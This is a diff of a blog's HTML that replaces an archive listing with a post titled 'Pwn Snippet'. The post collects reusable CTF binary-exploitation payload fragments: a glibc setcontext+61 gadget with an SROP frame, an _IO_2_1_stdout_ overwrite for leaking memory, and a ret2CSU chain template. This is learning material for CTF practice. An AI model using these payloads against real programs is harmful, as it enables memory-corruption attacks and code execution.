@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Trident91&#39;s Blog"/>
+        <meta property="og:title" content="Pwn Snippet"/>
     
 
     <!--Open Graph Description-->
@@ -33,7 +33,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -47,7 +47,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2021/5 - Trident91&#39;s Blog</title>
+    <title>Pwn Snippet - Trident91&#39;s Blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -124,9 +124,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -134,70 +132,68 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-chess-rook" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">2021/5</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2021/03/04/heap_writeup/">
-        <span class="archive-date">
-            Mar 2021
-        </span>
-        简单堆题write-up
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2021/05/20/pwn_snippet/">
+                Pwn Snippet
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-05-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Code/">Code</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="Code-Snippets-for-Pwn"><a href="#Code-Snippets-for-Pwn" class="headerlink" title="Code Snippets for Pwn"></a>Code Snippets for Pwn</h1><p>这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.</p>
+<h3 id="magic-gadget-setcontext-61-高版本glibc"><a href="#magic-gadget-setcontext-61-高版本glibc" class="headerlink" title="magic_gadget + setcontext+61 (高版本glibc)"></a>magic_gadget + setcontext+61 (高版本glibc)</h3><p>注1: <code>the_gadget</code> 即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">0x154b24:	mov    QWORD PTR [rsp],rax</span><br><span class="line">0x154b28:	call   QWORD PTR [rdx+0x20]</span><br></pre></td></tr></table></figure>
+
+<p>SROP+伪造栈帧,按需布置伪栈帧和ROP链即可:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; 0</span><br><span class="line">frame.rsp &#x3D; ROP_address</span><br><span class="line">frame.rip &#x3D; ret</span><br><span class="line"></span><br><span class="line">frame_str &#x3D; str(frame).ljust(frame_size,&quot;\x00)</span><br><span class="line">payload &#x3D; p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61) + frame_str[0x28:] </span><br><span class="line">payload +&#x3D; .....          #other stuff and ROP chain</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="_IO_2_1_stdout_"></a>_IO_2_1_stdout_</h3><p>覆盖为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(0xfbad1800)+p64(0x0)*3+&#39;\x00&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2CSU"><a href="#ret2CSU" class="headerlink" title="ret2CSU"></a>ret2CSU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p6r + p64(0) + p64(1) + fuction_ptr\ </span><br><span class="line">    + arg3 + arg2 + arg1 + mov_call\</span><br><span class="line">    + &quot;\x00&quot;*56 + return_address</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ctf/">#ctf</a> <a href="/tags/pwn/">#pwn</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
-                <div class="archive-post">
-    <a href="/2077/02/25/hello/">
-        <span class="archive-date">
-            Feb 2077
-        </span>
-        Hello
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2021/04/08/VNCTF2021/">
-        <span class="archive-date">
-            Apr 2021
-        </span>
-        VNCTF2021 Pwn
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2021/05/14/House%20of%20Botcake/">
-        <span class="archive-date">
-            May 2021
-        </span>
-        House of Botcake
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2021/05/14/House%20of%20Einherjar/">
-        <span class="archive-date">
-            May 2021
-        </span>
-        House of Einherjar
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2021/05/20/pwn_snippet/">
-        <span class="archive-date">
-            May 2021
-        </span>
-        Pwn Snippet
-    </a>
-</div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
